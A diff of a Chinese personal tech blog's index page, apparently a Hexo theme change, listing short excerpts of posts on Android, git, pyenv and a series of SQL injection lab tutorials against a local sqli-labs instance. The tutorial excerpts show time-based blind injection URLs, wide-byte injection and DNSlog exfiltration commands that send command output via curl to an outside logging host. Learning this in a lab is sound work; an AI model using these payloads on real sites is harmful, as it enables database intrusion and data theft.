+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/395714690.html">1.自制脚本语言-第一章笔记</a>
+	      </div>
+	      <p>
+	      	
+                这是一个读两周自制脚本语言的笔记，然后立flag，这个月打算看完  
+day 11.1 机器语言 &amp;amp; 汇编语言
+机器语言： 不需要借助软件执行，不需要语言处理器，可以由硬件直接解释执行 一个位数很长的二进制数字
+
+汇编语言： 通过汇编语言程序表述巨大的数字，使其易于理解，需要通过软件转换成机器语言，这种软件称为汇编程序。汇编程序是一种最基本的语...
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/脚本语言/">脚本语言</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-07-03&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/脚本语言/">脚本语言</a></li></ul>
+	
+</div>
+
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/2024290485.html">1.4.1-SQL注入防御绕过-宽字节注入</a>
+	      </div>
+	      <p>
+	      	
+                01 宽字节注入原理
+什么是宽字节GB2312、GBK、GB8030、BIG5、Shift_JIS等这些都是常说的宽字节，实际为两字节。
+
+站点可能为了防止SQL注入，会加\转义’，最后变成\’  
+
+MySQL在使用GBK编码的时候，会认为两个字符为一个汉字。使用%df’进行编码，两个字符组合，认为是一个汉字。注：前一个Ascii码大于128才能到汉...
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/web安全/">web安全</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-06-30&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql注入/">sql注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web安全/">web安全</a></li></ul>
+	
+</div>
+
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/2129490429.html">github上fork了别人的项目后，再同步更新别人的提交</a>
+	      </div>
+	      <p>
+	      	
+                github上fork了别人的项目后，再同步更新别人的提交
+git remote -v
+git remote add upstream aaa
+git remote -v
+git remote remove upstream
+
+4.重新添加源代码库
+git remote add upstream &amp;lt;fork link&amp;gt;
+git remote...
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/git/">git</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-06-25&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/git/">git</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/马克/">马克</a></li></ul>
+	
+</div>
+
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/2319578569.html">jekyll-theme-H2O的gitalk相关配置</a>
+	      </div>
+	      <p>
+	      	
+                jekyll-theme-H2O的gitalk配置
+gitalk
+01.注册GitHub Application注册GitHub Application
+
     
-    <p>
-        <span>/</span>
-        
-        <span><a href="https://tea9.github.io">tea9</a></span>
-        <span>/</span>
-        
-        <span><a href="https://miracles666.github.io">Miracles</a></span>
-        <span>/</span>
-        
-        <span><a href="https://www.zhangqirun.cn">童年是个风筝的博客</a></span>
-        <span>/</span>
-        
-        <span><a href="https://townwang.com">文科中的技术宅</a></span>
-        <span>/</span>
-        
-        <span><a href="https://sunbossrs.github.io">耀日庄主的博客</a></span>
-        <span>/</span>
-        
-        <span><a href="https://www.pdcgame.com">pdcgame</a></span>
-        <span>/</span>
-        
-        <span><a href="http://gloomyghost.com/">gloomyghost</a></span>
-        <span>/</span>
-        
-        <span><a href="https://www.fghrsh.net">FGHRSH</a></span>
-        <span>/</span>
-        
-        <span><a href="https://a632079.me">藤の青</a></span>
-        <span>/</span>
-        
-        <span><a href="https://www.vseu.com/">幸运草</a></span>
-        <span>/</span>
-        
-        <span><a href="https://shawnzeng.com/">诗与酒</a></span>
-        <span>/</span>
-        
-        <span><a href="https://nekohome.moenya.cat">NekoHome 喵窝</a></span>
-        <span>/</span>
-        
-        <span><a href="https://www.lkxin.cn">清酒踏月</a></span>
-        <span>/</span>
-        
-        <span><a href="http://www.ad-s.cn/">冰峰博客</a></span>
-        <span>/</span>
-        
-        <span><a href="http://login546.xyz">Unique</a></span>
-        <span>/</span>
-        
-        <span><a href="https://1000yun.cn/">雨落泪尽</a></span>
-        <span>/</span>
-        
-        <span><a href="https://laugh12321.github.io">Laugh&#39;s Blog</a></span>
-        <span>/</span>
-        
-        <span><a href="https://shaozhi.site">ShaoZhi&#39;s Blog</a></span>
-        <span>/</span>
-        
-        <span><a href="https://www.xiz.im">Xiang Xiz</a></span>
-        <span>/</span>
-        
-        <span><a href="https://www.xx8.uk">lan酱的小窝</a></span>
-        <span>/</span>
-        
-        <span><a href="https://www.ckbug.com">Casey</a></span>
-        <span>/</span>
-        
-        <span><a href="http://poi.ac/">星夜的蓝天</a></span>
-        <span>/</span>
-        
-        <span><a href="http://www.oneinf.com">俍注</a></span>
-        <span>/</span>
-        
-        <span><a href="https://darkwing.moe/">暗羽表姐</a></span>
-        <span>/</span>
-        
-        <span><a href="http://ju5tw4nty0u.top/">ju5tw4nty0u</a></span>
-        <span>/</span>
-        
-        <span><a href="http://www.itfire.cn">如鱼说|仓鼠的博客</a></span>
-        <span>/</span>
-        
-        <span><a href="https://www.k0rz3n.com/">k0rz3n</a></span>
-        <span>/</span>
-        
-        <span><a href="http://ikmoe.com/">月宅酱</a></span>
-        <span>/</span>
-        
-        <span><a href=" https://www.julydate.com">七夏浅笑</a></span>
-        <span>/</span>
-        
-        <span><a href="https://www.xytsing.com">咸鱼滩音乐团队</a></span>
-        <span>/</span>
-        
-        <span><a href="http://eternalsakura13.com/">sakura</a></span>
-        <span>/</span>
-        
-        <span><a href="https://snowflowersnowflake.github.io/">y00</a></span>
-        <span>/</span>
-        
-        <span><a href="http://www.teagle.top/">楼兰</a></span>
-        <span>/</span>
-        
-        <span><a href="https://0chencc.github.io">林晨</a></span>
-        <span>/</span>
-        
-        <span><a href="http://console-log.cn/">Xenc</a></span>
-        <span>/</span>
-        
-        <span><a href="https://cybersecur1ty.github.io/">华强</a></span>
-        <span>/</span>
-        
-        <span><a href="https://blog.csdn.net/zcj_1996">secES</a></span>
-        <span>/</span>
-        
-        <span><a href="https://milktea.info">奶茶姐姐</a></span>
-        <span>/</span>
-        
-        <span><a href="https://evil-of-blad.github.io/">blad</a></span>
-        <span>/</span>
-        
-        <span><a href="https://blog.xiafeng2333.top/">夏风</a></span>
-        <span>/</span>
-        
-    </p>
-    
-    <p>
-        <span id="busuanzi_container_site_pv">
-            <span id="busuanzi_value_site_pv"></span>PV
-        </span>
-        <span id="busuanzi_container_site_uv">
-            <span id="busuanzi_value_site_uv"></span>UV
-        </span>
-        Created By <a href="https://hexo.io/">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
-    <p>
-        <a href="/v1">v1</a>
-        <a href="/v2">v2</a>
-    </p>
-</footer>
+Application name:项目名称  
+Homepage URL:域名地址  
+Application description:项目描述  
+Authorization callb...
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/jekyll/">jekyll</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-06-24&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/blog/">blog</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gitalk/">gitalk</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/jekyll/">jekyll</a></li></ul>
+	
+</div>
+
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/2964387005.html">1.3.3-SQL注入-SQL盲注-Dnslog盲注</a>
+	      </div>
+	      <p>
+	      	
+                
+需要目标机器时windows系统
+
+DnsLog盲注DnsLog盲注原理Dnslog平台：http://ceye.io/
+http://ceye.io/profile
+curl mzq83x.ceye.io
+
+curl `whoami`.mzq83x.ceye.io
 
 
 
+DnsLog盲注方法
+核心语法： SELECT LOAD_FILE(CONCA...
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/web安全/">web安全</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-06-23&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql注入/">sql注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql盲注/">sql盲注</a></li></ul>
+	
+</div>
 
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":200,"height":350},"mobile":{"show":true},"log":false});</script></body>
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/4135600167.html">1.3.2-SQL注入-SQL盲注-时间盲注</a>
+	      </div>
+	      <p>
+	      	
+                时间盲注时间盲注原理
+时间盲注方法
+http://localhost:90/Less-10/?id=1&amp;quot; and if(left(user(),1)=&amp;apos;a&amp;apos;,0,sleep(3))--+
 
-<script>
-    // We expose some of the variables needed by the front end
-    window.hexo_search_path = "search.json"
-    window.hexo_root = "/"
-    window.isPost = false
-</script>
-<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
-<script src="/js/index.js"></script>
-<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+http://localhost:90/Less-10/?id=1&amp;quot; and if(left(select table_na...
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/web安全/">web安全</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-06-23&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql注入/">sql注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql盲注/">sql盲注</a></li></ul>
+	
+</div>
+
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/2904355367.html">1.3.1-SQL注入-SQL盲注-布尔盲注</a>
+	      </div>
+	      <p>
+	      	
+                SQL盲注-布尔盲注01布尔盲注原理$id=$_GET[&amp;apos;id&amp;apos;];
+$sql=&amp;quot;SELECT * FROM users WHERE id=&amp;apos;$id&amp;apos; LIMIT 0,1 &amp;quot;;
+$result=mysql_query($sql);
+$row=mysql_fetch_array($result)...
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/web安全/">web安全</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-06-21&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql注入/">sql注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql盲注/">sql盲注</a></li></ul>
+	
+</div>
+
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/2304481464.html">android微信第三方登录1</a>
+	      </div>
+	      <p>
+	      	
+                github测试地址微信SDK下载地址微信开放平台微信api  
+开始接入微信登录1.申请你的AppID注意：  
+包名正确（重要）签名正确（重要）微信提供的签名生成工具把包名添加上去就可以获取签名注意：把要获取签名的应用安装在手机上获取签名应用  
+2.下载开发工具包https://open.weixin.qq.com/cgi-bin/showdoc...
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/android/">android</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-06-21&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/android/">android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/weixin/">weixin</a></li></ul>
+	
+</div>
+
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/1015207598.html">recyclerview嵌套recyclerview</a>
+	      </div>
+	      <p>
+	      	
+                
+
+实现思路就是在一个recyclerview的adapter中 在初始化一个recyclerview 的adapter
+布局文件activity_main.xml
+&amp;lt;ScrollView xmlns:android=&amp;quot;http://schemas.android.com/apk/res/android&amp;quot;
+    xmlns:...
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/android/">android</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-06-21&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/adnroid/">adnroid</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/recyclerview/">recyclerview</a></li></ul>
+	
+</div>
+
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/208407023.html">android 代码样式规范</a>
+	      </div>
+	      <p>
+	      	
+                原文地址 把重点记录下https://source.android.com/source/code-style.html
+1.不要忽略异常(空的catch字句)  
+  不要不捕获异常  
 
 
+2.不要使用Findlizer  
+Finalizer是一种在对象被垃圾回收时执行一段代码的方法。虽然他们可以方便地进行清理（特别是外部资源），但是没有保证什么...
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/android/">android</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-06-21&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/android/">android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/code-standard/">code_standard</a></li></ul>
+	
+</div>
 
-<!--create by tea9-->
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/3369655730.html">android EventBus 使用</a>
+	      </div>
+	      <p>
+	      	
+                2017 10 27EventBus是什么？首先有两个概念发布者/订阅者  
+发布者就是 发送事件订阅者 就是接收事件  
+gradle
 
-<!--end-->
+compile &amp;apos;org.greenrobot:eventbus:3.0.0&amp;apos;
+1.定义事件
+
+// 定义事件 这个就是你要传送的数据实体类
+public static class Messag...
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/android/">android</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-06-21&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/android/">android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/eventbus/">eventbus</a></li></ul>
+	
+</div>
+
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/273860866.html">android微信第三方登录2</a>
+	      </div>
+	      <p>
+	      	
+                利用http与微信通信换取用户信息和openid使用了okhttp作为http通信的框架  
 
 
+首先实例化okhttp连接  
+ private final OkHttpClient client = new OkHttpClient();
 
 
+获得codecase BaseResp.ErrCode.ERR_OK:
+//      可用以下两种方法获...
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/android/">android</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-06-21&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/android/">android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/weixin/">weixin</a></li></ul>
+	
+</div>
 
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/378823961.html">网络课程列表</a>
+	      </div>
+	      <p>
+	      	
+                edx：edX是麻省理工和哈佛大学于2012年4月联手创建的大规模开放在线课堂平台。它免费给大众提供大学教育水平的在线课堂。两所大学在这个非盈利性计划各资助三千万美元。2012年秋天，edX在MITx启动。https://www.edx.org/coursehttps://www.edx.org/edxchina  
+coursera：在线学习平台。推...
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/课程/">课程</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-06-17&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/web安全/">web安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/密码/">密码</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/推荐/">推荐</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/课程/">课程</a></li></ul>
+	
+</div>
+
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/4239639054.html">1.2.2-SQL注入-SQL注入语法类型-报错注入</a>
+	      </div>
+	      <p>
+	      	
+                报错注入01 报错注入原理构造payload让信息通过错误提示回显出来应用场景：查询不回显内容，会打印错误信息Update、insert等语句，会打印错误信息  
+if($row)
+{
+    echo &amp;apos;Your Login name:&amp;apos;.$row[&amp;apos;username&amp;apos;];
+}
+else
+{
+    print...
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/web安全/">web安全</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-06-16&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql注入/">sql注入</a></li></ul>
+	
+</div>
+
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/2839042794.html">1.2.1-SQL注入-SQL注入语法类型-union联合查询注入</a>
+	      </div>
+	      <p>
+	      	
+                union查询注入union介绍SQL UNION 操作符用于合并两个或多个SELECT语句的结果集。注意：SELECT语句必须拥有相同数量的列。列也必须拥有相似的数据类型。每条SELECT语句中列的顺序必须相同。  
+默认情况，UNION操作符选取不同的值，允许重复的值，使用UNION ALL。  
+SELECT column_name(s) FRO...
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/web安全/">web安全</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-06-16&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql注入/">sql注入</a></li></ul>
+	
+</div>
+
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/2422499851.html">启动docker_sqli-labs_命令</a>
+	      </div>
+	      <p>
+	      	
+                docker images
+
+docker run -dt --name sqli -p 90:80 --rm acgpiano/sqli-labs
+
+docker ps -a
+
+docker exec -it &amp;lt;id&amp;gt; /bin/bash
+
+mysql -uroot // 进入 mysql
+
+
+docker ps -a 
+docker s...
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/web安全/">web安全</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-06-13&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqli-labs/">sqli-labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web安全/">web安全</a></li></ul>
+	
+</div>
+
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/849770471.html">使用pyenv切换python版本</a>
+	      </div>
+	      <p>
+	      	
+                关键代码which python3.6
+
+brew install pyenv
+
+pyenv install --list // 可安装的python版本
+pyenv install -v 2.7.10 // 安装python
+pyenv rehash // 更新
+pyenv versions // 查看已经安装的python版本
+pyenv glob...
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/python/">python</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-06-12&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/pyenv/">pyenv</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li></ul>
+	
+</div>
+
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/1129050045.html">1.1.1-SQL注入-SQL注入基础-SQL手工注入方法</a>
+	      </div>
+	      <p>
+	      	
+                MySQL手工注入01 MySQL数据库结构
+核心原理：MySql内置的infromation_schema库，它功能强大，是我们进行MySql注入的基石！
+select schema_name from information_schema.schemata // 查库
+select table_name from information_schem...
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/web安全/">web安全</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-06-11&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql注入/">sql注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web安全/">web安全</a></li></ul>
+	
+</div>
+
+	    </article>
+	    <hr class="two">
+	  
+	</section>
+	
+    <nav class="pagination" role="navigation">
+        <div id="page-nav">
+        	    
+            <a class="extend prev" rel="prev" href="/page/2/"><i class="iconfont">&#xe65c;</i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/4/"><i class="iconfont">&#xe65d;</i></a>
+        </div>
+    </nav>
+	
+</div>
+
+		<hr />
+<div class="footer">
+	
+        
+            <a href="//github.com/praming" rel="external nofollow" title="Github" target="_blank">
+		    	<i class="iconfont">&#xeee2;</i>
+		    </a>&nbsp;&nbsp;
+        
+            <a href="mailto:i@praming.cn" rel="external nofollow" title="邮箱" target="_blank">
+		    	<i class="iconfont">&#xe69f;</i>
+		    </a>&nbsp;&nbsp;
+        
+            <a href="34721974" rel="external nofollow" title="微信" target="_blank">
+		    	<i class="iconfont">&#xe7e5;</i>
+		    </a>&nbsp;&nbsp;
+        
+            <a href="//weibo.com/praming" rel="external nofollow" title="微博" target="_blank">
+		    	<i class="iconfont">&#xe629;</i>
+		    </a>&nbsp;&nbsp;
+        
+            <a href="/atom.xml" rel="external nofollow" title="RSS" target="_blank">
+		    	<i class="iconfont">&#xe6ee;</i>
+		    </a>&nbsp;&nbsp;
+        
+	
+</div>
+<script src="/js/highlight.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+		<div class="copyright">
+	Copyright &copy; 2019 . 豫ICP备10206454号-2<br />Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>&nbsp;&nbsp;&sdot;&nbsp;&nbsp;Theme is <a href="https://github.com/praming/hexo-theme-Ice" target="_blank">Ice</a>&nbsp;&nbsp;&sdot;&nbsp;&nbsp;Hosted by <a href="https://pages.coding.me">Coding Pages</a>
+</div>
+  <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":200,"height":350},"mobile":{"show":true},"log":false});</script></body>
 </html>
